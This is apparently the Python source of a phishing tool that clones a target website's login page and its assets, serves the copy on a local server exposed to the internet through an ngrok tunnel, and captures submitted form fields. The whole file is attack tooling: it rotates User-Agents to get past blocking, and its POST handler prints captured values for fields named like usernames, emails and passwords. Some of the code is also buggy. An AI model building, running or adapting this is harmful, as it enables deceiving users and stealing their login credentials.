import http.server
from http.server import HTTPServer
from urllib.request import urlopen
from pathlib import Path
from pyngrok import ngrok
import requests
import shutil
import urllib
import threading
import time
import sys
import os
import cgi
import re

dns = ""
local = 0
port = 0
page = ''
users = []


references = "username","user","user_login","email","pass","number","user_password","user_pass","passwd","password","pwd","session[password]","session[username_or_email]"

# User-Agents
a_user_agents = {
    0:"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64)" # add more*
}

def recursive_downloader(target_url):
    # start the main funcionality, recursive download
    
    default_agent = a_user_agents[0]

    print("[+] Starting recursive download")
    print("[+] Scanning all content")
    
    scrapper_url = target_url
    size = len(scrapper_url) - 1
        
    #if scrapper_url.endswith(".php") or scrapper_url.endswith(".html"):
    while size > 0:
        if scrapper_url[size] == "/":
            break
        else:
            scrapper_url = scrapper_url[:size]
            
        size = size - 1

    print("[+] New url for current directory : {}".format(scrapper_url))

    try:
        f = open("index.html","r").read() # read the main page
    except UnicodeDecodeError:
        print("[!] Error UnicodeDecodeError in index.html, trying with UTF-8...")
        
        try:
            f = open("index.html","r").read().decode('UTF-8','ignore') # read the main page
        except UnicodeDecodeError:
            try:
                print("[!] Error again with UTF-8")
                print("[+] Downloading new webpage and bypassing...")
                    
                temp = urllib.request.urlopen(target_url)
                f = temp.read().decode()
                
                print("[+] Got new webpage, starting parsing")
                
            except:
                print("[!] Fatal error (Connection Timeout or Reseted). Quiting")
                sys.exit()
    
    # download css files first
    
    myre = re.findall(r'href="[\'"]?([^\'">]+).css"',f)
    myre_images = re.findall(r'src="[\'"]?([^\'">]+).png"',f)
    myre_js = re.findall(r'script src="[\'"]?([^\'">]+).js"',f)
    
    #myre_general = re.findall(r'src="[\'"]?([^\'">]+)"',f) Next release
    
    a = len(myre)
    a_images = len(myre_images)
    a_js = len(myre_js)
    #a_general = len(myre_general) Next release
    
    print("[+] Found ",a," css files to download")
    counter = 1
    new_f = f # backup file to replace ever css location tag
    
    if a != 0:
        for i in myre:
            
            old_dir = i+'.css'
            new_dir = './wdata/'+i.replace("https://","")
            new_dir = './wdata/'+i.replace("http://","")
            
            request = urllib.request.Request(scrapper_url+i+'.css',headers={
            "User-Agent":default_agent,
            "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
            })
            
            print("[+] {} -> {}".format(counter,i+'.css'))
            counter = counter + 1
            
            # here, we will download the css files and store it back
            
            try:
            
                response = urllib.request.urlopen(request,timeout=60)
                html = response.read()
                new_f = re.sub(old_dir,new_dir+'.css',new_f)
                
                try:
                    os.makedirs(new_dir)            
                except FileExistsError:
                    pass
                try:
                    html = html.decode('CP949')
                except UnicodeDecodeError:
                    html = html.decode('UTF-8')
                
                #urllib.request.urlretrieve(scrapper_url+i+'.css',new_dir+'.css')
                filepath = new_dir+'.css'
                
                temp = open(filepath,"w")
                temp.write(html)
                temp.close()
            except:
                print("[!] Cannot download and modify {}".format(i))
                print("[+] Trying to grab from main url, generating link")
                
                count = 3
                new_link = ""
                
                for x in scrapper_url:
                    if count == 0:
                        break
                    elif x == "/":
                        new_link = new_link + x
                        count = count - 1
                    else:
                        new_link = new_link + x
                        
                new_link = new_link[:len(new_link)-1]
                print("[+] New link: ",new_link)
                
                try:
                    request = urllib.request.Request(new_link+i+'.css',headers={
            "User-Agent":default_agent,
            "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
            })
                
                    response = urllib.request.urlopen(request,timeout=60)
                    html = response.read()
                    new_f = re.sub(old_dir,new_dir+'.css',new_f)
                    
                    try:
                        os.makedirs(new_dir)            
                    except FileExistsError:
                        pass
                    try:
                        html = html.decode('CP949')
                    except UnicodeDecodeError:
                        html = html.decode('UTF-8')
                
                    filepath = new_dir+'.css'
                    
                    temp = open(filepath,"w")
                    temp.write(html)
                    temp.close()
                    print("[+] Alternative download worked")
                    
                except:
                    print("[!] Cannot download and modify {}".format(i))                
        
        counter = 1
    else:
        print("[!] No CSS found!")
    
    # for images
    if a_images != 0:
        print("[+] Found ",a_images," images to download")
        
        for i in myre_images:
            extension = ".png" # by default, to avoid error
            
            if i.endswith(".png"):
                extension = ".png"
            elif i.endswith(".jpeg"):
                extension = ".jpeg"
                
            if i[0] == "/":
                i = i[1:]
                
            try:
                request = urllib.request.Request(scrapper_url+i+extension,headers={
                "User-Agent":default_agent,
                "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
                })
                
                print("[+] {} -> {}".format(counter,i+extension))
                counter = counter + 1
                
                old_dir = i+extension
                new_dir = './wdata/'+i.replace("https://","")
                new_dir = './wdata/'+i.replace("http://","")
                new_f = re.sub(old_dir,new_dir+extension,new_f)
                
                new_dir = re.sub("https://|http://","",new_dir)
                
                os.makedirs(new_dir)            
                
                if i.startswith("https://"):
                    try:
                        urllib.request.urlretrieve(i+extension,new_dir+extension)
                    except:
                        print("[!] Cannot download -> ",i+extension)
                elif i.startswith("http://"):
                    try:
                        urllib.request.urlretrieve(i+extension,new_dir+extension)
                    except:
                        print("[!] Cannot download -> ",i+extension)
                        
                else:
                    try:
                        urllib.request.urlretrieve(scrapper_url+i+extension,new_dir+extension)
                    except:
                        print("[!] Cannot download -> ",scrapper_url+i+extension)
            except:
                print("[+] Trying to grab from main url, generating link")
                
                count = 3
                new_link = ""
                
                for x in scrapper_url:
                    if count == 0:
                        break
                    elif x == "/":
                        new_link = new_link + x
                        count = count - 1
                    else:
                        new_link = new_link + x
                        
                new_link = new_link[:len(new_link)-1]
                print("[+] New link: ",new_link)
                     
    else:
        print("[!] No images found!")
        
    # for javascript
    if a_js != 0:
        for i in myre_js:
            
            #old_dir = i+'.js' # for debug
            old_dir = i+'.js'
            new_dir = './wdata/'+i.replace("https://","")
            new_dir = './wdata/'+i.replace("http://","")
            
            request = urllib.request.Request(scrapper_url+i,headers={
            "User-Agent":default_agent,
            "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
            })
            
            print("[+] {} -> {}".format(counter,i))
            counter = counter + 1
            
            # here, we will download the css files and store it back
            try:
                response = urllib.request.urlopen(request,timeout=60)
                html = response.read()
                #new_f = re.sub(old_dir,new_dir+'.css',new_f)
                new_f = re.sub(old_dir,new_dir,new_f)
                
                try:
                    os.makedirs(new_dir)            
                except FileExistsError:
                    pass
                try:
                    html = html.decode('CP949')
                except UnicodeDecodeError:
                    html = html.decode('UTF-8')
                
                filepath = new_dir+'.js'
                
                temp = open(filepath,"w")
                temp.write(html)
                temp.close()
            except:
                print("[!] Cannot download and modify {}".format(i))
        
        counter = 1
    else:
        print("[!] No Javascript files found!")
    
    # for other files
    print("[+] Finished - Retrieved {} files".format(a+a_js+a_images))
    
    # modify the webpage t correctly find the location of all files
    
    #a = open("./index.html","w")
    
    with open('./index.html','wb') as a:
        new_f = re.sub(r'action="[\'"]?([^\'">]+)"',target_url,new_f)
        a.write(new_f.encode())
        
    print("[+] Finished recursive download, starting server")

def download_url(url):
    global page
    default_agent = a_user_agents[0]
    html = ""
    #myre_js = re.findall(r'script src="[\'"]?([^\'">]+).js"',f)

    print("[!] Downloading...")
    
    request = urllib.request.Request(url,headers={
        "User-Agent":default_agent,
        "Accept-Charset":"ISO-8859-2,utf-8;q=0.7,*;q=0.7"
        })
    
    try:
        target = urllib.request.urlopen(request,timeout=60)
        html = target.read()
        html = re.replace(r'action="[\'"]?([^\'">]+)"',"action='#'",html)
        
    except ConnectionResetError:
        print("[!] Remote host blocked our connection")
        print("[+] Trying to bypass with User-Agent rotation...")
        
        # stage one of User-Agent rotation
        r = len(a_user_agents)
        
        while(r > -2):
            default_agent = a_user_agents[r-1]
            try:
                target = urllib.request.urlopen(request,timeout=60)
                html = target.read()
                html = re.replace(r'action="[\'"]?([^\'">]+)"',"action='#'",html)
                
                print("[+] Sucefully bypassed")
                break
            except ConnectionResetError:
                pass
            r = r - 1
            
            if(r == -1):
                print("[!] Cannot download url, try again later!")
                sys.exit()
    except:
        print("[Fatal] Cannot download! Possible erros: Timeout Error, connection reset, or internal")
    
    try:
        html = html.decode('CP949','ignore')
    except UnicodeDecodeError:
        html = html.decode('UTF-8','ignore')
    except:
        # fixed bugs
        html = html
    
    print("[!] Parsing the content...")

    parser = html
    parser.replace("GET","POST")
    parser.replace("get","post")

    if os.path.exists("./index.html"):
        os.remove("./index.html")
        try:
            shutil.rmtree("./wdata/")
        except:
            pass
        
        print("[!] Found old files, deleting!")
    else:
        print("[!] No recent files detected, skipping")
    
    try:
        urllib.request.urlretrieve(url,'./index.html')
    except ConnectionResetError:
        print("[!] Remote host blocked our connection")
        print("[+] Trying to bypass with User-Agent rotation...")
        
        # stage one of User-Agent rotation
        r = len(a_user_agents)
        
        while(r > -2):
            default_agent = a_user_agents[r-1]
            try:
                urllib.request.urlretrieve(url,'./index.html')
                print("[+] Sucefully bypassed")
                break
            except ConnectionResetError:
                pass
            r = r - 1
            
            if(r == -1):
                print("[!] Cannot download url, try again later!")
                sys.exit()
                
    print("[!] Finished parsing")

def run(LHOST, LPORT, url):
    LHOST = str(LHOST)
    LPORT = int(LPORT)

    port = LPORT
    local = LHOST


    download_url(url)
    recursive_downloader(url)

    try:
        httpd = HTTPServer((LHOST,LPORT),handler)
        
    except:
        print("\033[1;31m[!] Cannot bind server!\033[m")
        if(LPORT == 80):
            print("\033[1;33m[!] We detected your setting with LPORT at 80, to use it, start NERO as root\033[m")
        else:
            print("\033[1;31m[!] Try another port\033[m")
        return

    print('\033[1;37m[+] Server started at',time.asctime(),'\033[m')
    print("\033[1;37m[+] Current page directory: /\033[m")
    
    # setup ngrok
    configuration = {
        "remote_addr":LPORT,
        "bind_tls":True
    }
    
    try:
        public_url = ngrok.connect(options=configuration)
    except:
        print("[!] Cannot generate url")
        
    tunnels = ngrok.get_tunnels()
    print("[ => Ngrok link : {}".format(tunnels[0].public_url))

    try:
        httpd.serve_forever()

    except KeyboardInterrupt:
        print("\033[1;31m[!] Stopped by user\033[m")

    except:
        log_file = open("log.txt","+r")
        log_file.write(file)
        log_file.close()
        print("\033[1;31m[!] Cannot start server!\033[m")

class handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
                
        if self.path == "/":
            self.path = "/index.html"
         
        if not self.client_address[0] in users:
            users.append(self.client_address[0])
            print("\033[1;34m[+] Connection from: {}\033[m".format(self.client_address[0]))
        
        else:
            print("\033[1;34m[+] Client doing something: {}\033[m".format(self.client_address[0])) 
        
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
        
    def do_POST(self):
        form = cgi.FieldStorage(self.rfile,
        headers=self.headers,
        environ={'REQUEST_METHOD':'POST',
                 'CONTENT_TYPE':self.headers['Content-Type'],})
        form = str(form)

        form = re.sub("FieldStorage|None|MiniFieldStorage|[\(\)\[\]\,\']",'',form)
        form = form.split(" ")
          
        x = 0
        
        # update
        # since i only shows the form with the credentials, is more intuitive to show ever post data.
        # only do it if found an post with the same value in the dictionary, to avoid trash on the log
        
        found_something = False
        
        try:
            while x < len(form):
                if form[x] != "":
                    if form[x] in references:
                        found_something = True
                        break
                    else:
                        pass
                x = x+1           
        except:
            pass
        
        if found_something == True:
            print("=======[ POST From Received ]=======")
            try:
                while x < len(form):
                    if form[x] != "":
                        if form[x] in references:
                            print("\033[1;31m[*] {} => {}\033[m".format(form[x],form[x+1]))
                        else:
                            print("\033[1;30m[*] {} => {}\033[m".format(form[x],form[x+2]))
                    x = x+2
            except:
                pass 
            print("===================================")
        else:
            print("[+] No important data to show, skipping")
            found_something =  False